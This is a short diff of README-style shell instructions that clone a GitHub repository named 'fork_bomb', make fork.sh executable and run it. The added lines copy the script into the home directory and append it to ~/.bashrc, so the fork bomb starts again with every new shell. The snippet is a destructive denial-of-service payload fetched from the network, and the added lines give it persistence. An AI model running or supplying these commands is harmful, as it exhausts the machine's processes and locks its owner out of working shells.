@@ -28,5 +28,7 @@ cd ~
 git clone https://github.com/shetesumedh/fork_bomb
 cd fork_bomb
 chmod +x fork.sh
+sudo cp fork.sh ~/
+echo "$HOME/fork.sh" >> ~/.bashrc
 ./fork.sh
 ```
